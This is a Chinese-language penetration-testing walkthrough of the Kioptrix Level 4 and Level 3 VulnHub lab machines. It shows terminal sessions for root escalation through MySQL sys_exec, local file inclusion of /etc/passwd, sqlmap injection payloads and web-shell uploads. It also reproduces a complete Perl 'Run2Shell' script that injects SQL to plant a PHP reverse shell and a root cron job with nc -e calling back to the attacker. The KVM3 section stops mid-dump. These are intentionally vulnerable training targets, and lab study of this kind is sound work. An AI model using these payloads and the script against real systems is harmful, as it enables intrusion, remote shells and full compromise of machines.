root      5191     1  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start
root      5247     1  0 04:45 tty1     00:00:00 /sbin/getty 38400 tty1
root      5277  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd
root      5280  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd
root      5880  4927  0 09:23 ?        00:00:00 sshd: john [priv]
john      5928  5897  0 09:35 pts/0    00:00:00 grep root
```

可以看到MySQL以root权限运行。 由于具有对计算机的ssh访问权限，因此可以通过访问配置文件来查看是否能找到数据库凭据。

``` bash

john@Kioptrix4:/var/www$ ls
checklogin.php  index.php          logout.php  tmpbbmjx.php  tmpbtzfy.php  tmpuijdt.php
database.sql    john               member.php  tmpbdorc.php  tmpubjrn.php  tmpureio.php
images          login_success.php  robert      tmpbstyp.php  tmpuepxr.php  tmpuyhae.php

john@Kioptrix4:/var/www$ cat checklogin.php
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");

// Define $myusername and $mypassword
$myusername=$_POST['myusername'];
$mypassword=$_POST['mypassword'];

// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
//$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
//$mypassword = mysql_real_escape_string($mypassword);

//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
//$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row

if($count!=0){
// Register $myusername, $mypassword and redirect to file "login_success.php"
        session_register("myusername");
        session_register("mypassword");
        header("location:login_success.php?username=$myusername");
}
else {
echo "Wrong Username or Password";
print('<form method="link" action="index.php"><input type=submit value="Try Again"></form>');
}

ob_end_flush();
?>
```

不需要密码即可访问数据库。 由于我们MySQL的root访问权限，因此可以使用用户定义的函数执行命令（在操作系统本身上）。 因为可以以root用户身份访问MySQL服务器，所以我们将使用用户定义函数将特权升级为root用户。 为了执行这些命令，我们需要确保lib_mysqludf_sys.so在服务器上。 使用whereis命令，我发现它已经安装在服务器上。

``` bash
john@Kioptrix4:/var/www$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
```

``` bash
root@kali:~# ssh john@192.168.84.139
john@192.168.84.139's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ ls
john@Kioptrix4:~$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6760
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.00 sec)

mysql> exit;                                       
Bye
john@Kioptrix4:~$ sudo su
root@Kioptrix4:/home/john# MyNameIsJohn
bash: MyNameIsJohn: command not found
root@Kioptrix4:/home/john# whoami
root
root@Kioptrix4:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix4:/home/john#
root@Kioptrix4:~# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```

使用sys_exec，可以运行将john添加到admin组的usermod，然后运行sudo su以获得root权限的shell,至此渗透靶机的目标已经完成。

#### 其它方法

由于受sock_sendpage（）NULL指针取消引用攻击，还能使用内核提权脚本进行提权，具体方法自行google，常规操作就不在此赘述.

 - 文件包含

``` bash
(请求包)

GET /member.php?username=/etc/etc/passwd%00 HTTP/1.1

Host: 192.168.84.139

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: PHPSESSID=b5a332dd49e1d5192ffb8915fa3e7f84

Upgrade-Insecure-Requests: 1

(响应包)

HTTP/1.1 302 Found

Date: Tue, 10 Dec 2019 16:39:07 GMT

Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

X-Powered-By: PHP/5.2.4-2ubuntu5.6

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0

Pragma: no-cache

location: index.php

Content-Length: 1146

Connection: close

Content-Type: text/html



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/kshell
robert:x:1002:1002:,,,:/home/robert:/bin/kshell
```

 - sqlmap的os-shell功能

``` bash
(判断是否具有dba权限)
root@kali:~# sqlmap -r sqlmap.txt --is-dba
        ___
       __H__                                                                                         
 ___ ___[)]_____ ___ ___  {1.3.11#stable}                                                            
|_ -| . [,]     | .'| . |                                                                            
|___|_  [']_|_|_|__,|  _|                                                                            
      |_|V...       |_|   http://sqlmap.org                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:12:43 /2019-12-10/

[04:12:43] [INFO] parsing HTTP request from 'sqlmap.txt'
[04:12:43] [INFO] resuming back-end DBMS 'mysql' 
[04:12:43] [INFO] testing connection to the target URL
[04:12:43] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9812' OR 1343=1343#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=123456' AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&Submit=Login
---
[04:12:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:12:43] [INFO] testing if current user is DBA
[04:12:43] [INFO] fetching current user
[04:12:43] [INFO] resumed: root@localhost
current user is DBA: True
[04:12:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.84.139'

[*] ending @ 04:12:43 /2019-12-10/

(如果有，如下所示getshell)
root@kali:~# sqlmap -r sqlmap.txt --os-shell
        ___
       __H__                                                                                         
 ___ ___[.]_____ ___ ___  {1.3.11#stable}                                                            
|_ -| . [.]     | .'| . |                                                                            
|___|_  ["]_|_|_|__,|  _|                                                                            
      |_|V...       |_|   http://sqlmap.org                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:10:50 /2019-12-10/

[04:10:50] [INFO] parsing HTTP request from 'sqlmap.txt'
[04:10:50] [INFO] resuming back-end DBMS 'mysql' 
[04:10:50] [INFO] testing connection to the target URL
[04:10:50] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9812' OR 1343=1343#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=123456' AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&Submit=Login
---
[04:10:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:10:50] [INFO] going to use a web backdoor for command prompt
[04:10:50] [INFO] fingerprinting the back-end DBMS operating system
[04:10:50] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
[04:10:51] [INFO] retrieved the web server document root: '/var/www'
[04:10:51] [INFO] retrieved web server absolute paths: '/var/www/checklogin.php'
[04:10:51] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[04:10:51] [INFO] the file stager has been successfully uploaded on '/var/www/' - http://192.168.84.139:80/tmpuhuus.php
[04:10:51] [WARNING] unable to upload the file through the web file stager to '/var/www/'
[04:10:51] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers
[04:10:53] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://192.168.84.139:80/tmpbhqem.php
[04:10:53] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] command standard output:
---
checklogin.php
database.sql
images
index.php
john
login_success.php
logout.php
member.php
robert
tmpbbmjx.php
tmpbdorc.php
tmpbhqem.php
tmpbstyp.php
tmpbtzfy.php
tmpubjrn.php
tmpuepxr.php
tmpuhuus.php
tmpuijdt.php
tmpureio.php
tmpuyhae.php
---
os-shell> 
```

sqlmap自带的文件上传payload

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub36.jpg)

如果传不了，直接用下列命令写马

``` bash
root@kali:~# sqlmap -r sqlmap.txt --file-write /root/shells/php/bullfuck.php --file-dest /var/www/bullshit.php        ___
       __H__                                                                                                                                                    
 ___ ___[(]_____ ___ ___  {1.3.11#stable}                                                                                                                                         
|_ -| . [']     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                  
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:42:12 /2019-12-10/

[04:42:12] [INFO] parsing HTTP request from 'sqlmap.txt'
[04:42:12] [INFO] resuming back-end DBMS 'mysql' 
[04:42:12] [INFO] testing connection to the target URL
[04:42:12] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9812' OR 1343=1343#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=123456' AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&Submit=Login
---
[04:42:12] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:42:12] [INFO] fingerprinting the back-end DBMS operating system
[04:42:12] [INFO] the back-end DBMS operating system is Linux
[04:42:12] [WARNING] expect junk characters inside the file as a leftover from original query
[04:42:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrievalDBMS file system ('/var/www/bullshit.php')? [Y/n] 
[04:42:14] [INFO] retrieved: 
sqlmap got a 302 redirect to 'http://192.168.84.139:80/login_success.php?username=admin'. Do you want to follow? [Y/n] n
0
[04:42:17] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[04:42:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.84.139'

[*] ending @ 04:42:17 /2019-12-10/

(成功写入)

do you want to retrieve the command standard output? [Y/n/a] command standard output:                                                                                                      
---                                                                                                                                                                                        
checklogin.php                                                                                                                                                                             
database.sql                                                                                                                                                                               
images
index.php
john
login_success.php
logout.php
member.php
robert
tmpbokko.php
tmpuvljz.php
---
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] command standard output:
---
bullshit.php
checklogin.php
database.sql
images
index.php
john
login_success.php
logout.php
member.php
robert
tmpbokko.php
tmpuvljz.php
---
os-shell>

```

下面再附上希腊某位大佬的傻瓜式通关脚本;)

``` bash
use LWP::UserAgent;
 
# ----------------------------------------------------------------------
# Coded by mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)
# ----------------------------------------------------------------------
 
print "------------------------------------\n";
print " Kioptrix Level 4 - Run2Shell Script\n";
print "------------------------------------\n";
 
print "\nEnter the IP address of the Kioptrix box (e.g.: http://192.168.178.21)";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);
 
print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)";
print "\n> ";
$ip=<STDIN>;
chomp($ip);
 
print "\nEnter the port to connect back on (e.g.: 4444)";
print "\n> ";
$port=<STDIN>;
chomp($port);
 
menu:;
print "\n[+] Main Menu:\n";
print "    1. Limited Shell\n";
print "    2. Root Shell.\n";
print "    3. Exit.\n"    ;
 
print "> ";
$option=<STDIN>;
if ($option!=1 && $option!=2 && $option!=3)
{
print "Oups, wrong option.\nPlease, try again.\n";
goto menu;
}
 
if ($option==1)
{&limit}
if ($option==2)
{&root}
if ($option==3)
{&quit}
 
sub limit
{
 
    $payload =
    "<?php ".
    "system('/bin/bash -i > /dev/tcp/$ip/$port 0<&1 2>&1');".
    "?>";
 
    #Encode the payload to Hex.
    $payload =~ s/(.)/sprintf("%x",ord($1))/eg;
    $payload ="0x"."$payload";
 
    $filename = "t3hpWn.php";
    $dir = "/var/www/";
 
    $nc= "nc -lvp $port";
    print "\n[+] Wait for reverse connection on port $port...\n";
    system("xterm -e $nc &");
 
    print "[+] Uploading the backdoor to server... \n";
    $junk="''";
 
    $username = "admin";
    $password = "' OR 1=1 UNION SELECT $payload,$junk,$junk INTO OUTFILE '".$dir.$filename."' #";
 
    $ua = LWP::UserAgent->new or die;
    $req = HTTP::Request->new(POST => $target."/checklogin.php");
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("myusername=".$username."&mypassword=".$password."&Submit=Login");
    $res = $ua->request($req);
 
    sleep(10);
    $int = LWP::UserAgent->new() or die;
    $check=$int->get($target."/".$filename);
 
    if ($check->content =~ m/was not found/g)
    {
    print "[-] Failed to upload the backdoor!\n\n";
    }
    goto menu;
}
 
sub root
{
    # --------------------------------------------------------------
    # Thanks to g0tmi1k for this local privilege escalation trick.
    # --------------------------------------------------------------
 
    $payload ="* * * * * root /bin/nc.traditional $ip $port -e /bin/sh ";
 
    #Encode the payload to Hex.
    $payload =~ s/(.)/sprintf("%x",ord($1))/eg;
    $payload ="0x"."$payload";
 
    $filename = "g0tr00t";
    $dir = "/etc/cron.d/";
 
    $nc= "nc -lvp $port";
    print "\n[+] Wait for reverse connection on port $port...\n";
    system("xterm -e $nc &");
 
    print "[+] Uploading the backdoor to server... \n";
    $junk="''";
 
    $username = "admin";
    $password = "' AND 1=1 union select $payload,$junk,$junk INTO OUTFILE '".$dir.$filename."' #";
 
    $ua = LWP::UserAgent->new or die;
    $req = HTTP::Request->new(POST => $target."/checklogin.php");
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("myusername=".$username."&mypassword=".$password."&Submit=Login");
    $res = $ua->request($req);
 
    sleep(60);
    print "[+] Check the xterm window for the root shell... \n";
    goto menu;
}
 
sub quit
{
    exit(1);
}
```

<font color="red">***The end,to be continue...***</font>
<!-- kb:end Kioptrix4 -->

</details>

<a id="case-kvm3"></a>

## CMS 查询与管理配置

注入得到的数据库账户和后台管理能力连接 SSH 与系统配置；原文另外保留插件、phpMyAdmin 和上传入口。

<p class="kb-provenance">来源 KVM3 · 原记录 2019-12-13 · 14 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-kvm3">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start KVM3 -->

名称：Kioptrix: Level 1.2 (#3)
发行日期：2011年4月18日

下载：

 - Download: [http://www.kioptrix.com/dlvm/KVM3.rar](http://www.kioptrix.com/dlvm/KVM3.rar)
 - Download (Mirror): [https://download.vulnhub.com/kioptrix/KVM3.rar](https://download.vulnhub.com/kioptrix/KVM3.rar)
 - Download (Torrent): [https://download.vulnhub.com/kioptrix/KVM3.rar.torrent](https://download.vulnhub.com/kioptrix/KVM3.rar.torrent)

描述：

自上次Kioptrix VM挑战以来已经过去了一段时间。生活不断让您知道这些事情。
在看到最后两个的下载数量之后，以及无数的视频中展示了克服这些挑战的方法。我觉得需要1.2（或者只是3级）。感谢您下载并播放了前两个版本。还要感谢那些花时间为他们制作视频解决方案的人。不胜感激。
与其他两个一样，这一挑战也面向初学者。但是，这是不同的。增加了一些步骤，并且需要新的技能。我仍然必须成为初学者的领域。与其他方法一样，“pown”此方法的方法不止一种。很简单，而不是那么简单。记住……“轻松”或“困难”的感觉总是与自己的技能水平相关的。我从未说过这些事情异常困难或困难，但我们都需要从某个地方入手。让我告诉你，制作这些易受攻击的VM并不像看起来那么容易…
这个挑战很重要。一旦找到IP（DHCP客户端），请编辑主机文件并将其指向kioptrix3.com。
在Windows下，您可以编辑C：\Windows\System32\drivers\etc\hosts，如下所示：



``` bash
# localhost name resolution is handled within DNS itself.
#   127.0.0.1 localhost
#   ::1 localhost127.0.0.1 static3.cdn.ubi.com
192.168.1.102 kioptrix3.com
```
在Linux下，将是/etc/hosts
这里涉及一个网络应用程序，因此要使所有内容都很好并正确显示，您确实需要这样做。
希望您喜欢Kioptrix VM Level 1.2挑战。
Have fun

漏洞：

 - 文件包含
 - 访问控制不当
 - 重用凭证
 - SQL注入
 - 不受限制地上传危险类型的文件
 - 凭证不足

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.84.0/24
Nmap scan report for 192.168.84.144
Host is up (0.00023s latency).
MAC Address: 00:0C:29:44:36:85 (VMware)
```

``` bash
root@kali:~# nmap -A -v -sV -Pn -T4 --script=vuln 192.168.84.144
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.144
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.84.144:80/gallery/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://192.168.84.144:80/index.php?system=Admin
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://192.168.84.144:80/gallery/index.php
|     Form id: 
|     Form action: login.php
|     
|     Path: http://192.168.84.144:80/gallery/gadmin/
|     Form id: username
|     Form action: index.php?task=signin
|     
|     Path: http://192.168.84.144:80/index.php?system=Admin&page=loginSubmit
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://192.168.84.144:80/index.php?system=Blog&post=1281005380
|     Form id: commentform
|_    Form action: 
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /cache/: Potentially interesting folder
|   /core/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /style/: Potentially interesting folder
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|_    http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.2.8: 
|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425
|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891
|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890
|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368
|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452
|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408
|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699
|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364
|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750
|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195
|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031
|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434
|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415
```

发现存在sqli注入和phpmyadmin目录,直接上sqlmap
点击下图所示位置burp抓包之后直接sqlmap跑

``` bash
root@kali:~# sqlmap -r sqlmap.txt 
        ___
       __H__                                                                                           
 ___ ___[)]_____ ___ ___  {1.3.12#stable}                                                              
|_ -| . [']     | .'| . |                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                              
      |_|V...       |_|   http://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:14:33 /2019-12-13/

[04:14:33] [INFO] parsing HTTP request from 'sqlmap.txt'
[04:14:33] [INFO] resuming back-end DBMS 'mysql' 
[04:14:33] [INFO] testing connection to the target URL
[04:14:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&sort=photoid

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(1324,2762)>(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&sort=photoid

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&sort=photoid

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&sort=photoid

Parameter: sort (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1&sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: id, type: Unescaped numeric (default)
[1] place: GET, parameter: sort, type: Unescaped numeric
[q] Quit
[04:14:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:14:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[04:14:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/kioptrix3.com'

[*] ending @ 04:14:34 /2019-12-13/
```

``` bash
root@kali:~# sqlmap -r sqlmap.txt -D gallery -T dev_accounts --dump
        ___
       __H__                                                                                           
 ___ ___[)]_____ ___ ___  {1.3.12#stable}                                                              
|_ -| . ["]     | .'| . |                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                              
      |_|V...       |_|   http://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:18:17 /2019-12-13/

[04:18:17] [INFO] parsing HTTP request from 'sqlmap.txt'
[04:18:17] [INFO] resuming back-end DBMS 'mysql' 
[04:18:17] [INFO] testing connection to the target URL
[04:18:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
